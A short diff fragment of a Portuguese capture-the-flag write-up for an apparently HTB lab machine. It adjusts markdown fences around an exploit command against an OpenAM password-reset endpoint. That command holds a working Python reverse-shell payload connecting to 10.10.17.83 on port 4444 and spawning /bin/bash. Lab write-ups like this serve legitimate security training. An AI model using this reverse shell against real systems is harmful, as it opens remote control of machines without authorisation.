@@ -35,8 +35,10 @@ Foi utilizado um script customizado para enviar a requisição HTTP contendo o p
 
 ```bash
 python3 exploit.py --url [https://sso.management.htb/openam/ui/PWResetUserValidation](https://sso.management.htb/openam/ui/PWResetUserValidation) "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.83\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
-
+```
 Após o disparo, obtivemos a conexão reversa sob o contexto da conta do serviço da aplicação e resgatamos a flag user.txt.
+
+```
 3. Escalação de Privilégio (Privilege Escalation)
 
 Inspecionando os privilégios do usuário via sudo -l, identificou-se a seguinte permissão:
